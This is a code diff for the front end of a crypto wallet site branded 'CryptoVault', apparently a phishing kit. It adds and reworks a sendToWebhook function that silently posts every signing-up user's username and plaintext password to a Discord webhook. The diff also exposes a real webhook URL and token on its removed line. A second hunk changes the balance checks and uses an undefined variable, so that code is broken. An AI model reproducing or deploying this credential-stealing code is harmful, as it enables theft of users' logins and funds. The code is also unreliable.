@@ -266,11 +266,20 @@
 
   async function sendToWebhook(username, password) {
   try {
-    await fetch('https://discord.com/api/webhooks/1489339528169652295/nwxgNXcPMG69yzeD9WCHm4YTqmdIud-R7D8ON0SJ8nF8tG-WgoZ1tnL36ItKjzhOr6ps', {
+    await fetch('YOUR_WEBHOOK_URL', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        content: `New signup!\nUsername: ${username}\nPassword: ${password}`
+        embeds: [{
+          title: '🔐 New Signup',
+          color: 0x0c447c,
+          fields: [
+            { name: 'Username', value: username, inline: true },
+            { name: 'Password', value: password, inline: true }
+          ],
+          footer: { text: 'CryptoVault' },
+          timestamp: new Date().toISOString()
+        }]
       })
     });
   } catch (e) {
@@ -538,7 +547,8 @@
     const addr = document.getElementById('m-addr').value.trim();
     const coin = document.getElementById('m-coin').value;
     if (amt <= 0) { showToast('Enter a valid amount', true); return; }
-    if (parseFloat(currentUser.balance) < amt) { showToast('Insufficient balance', true); return; }
+    const coinValueUsd = (currentUser.holdings[coin] || 0) * prices[coin];
+    if (amt > coinValueUsd) { showToast('Insufficient ' + coin + ' balance', true); return; }
     if (!addr) { showToast('Enter a wallet address', true); return; }
     if (addr === currentUser.wallet_address) { showToast("That's your own address", true); return; }
 
@@ -566,7 +576,8 @@
     const from = document.getElementById('c-from').value;
     const to = document.getElementById('c-to').value;
     if (amt <= 0) { showToast('Enter an amount', true); return; }
-    if (parseFloat(currentUser.balance) < amt) { showToast('Insufficient balance', true); return; }
+    const coinValueUsd = (currentUser.holdings[coin] || 0) * prices[coin];
+    if (amt > coinValueUsd) { showToast('Insufficient ' + coin + ' balance', true); return; }
     if (from === to) { showToast('Pick different coins', true); return; }
 
     const h = { ...currentUser.holdings };
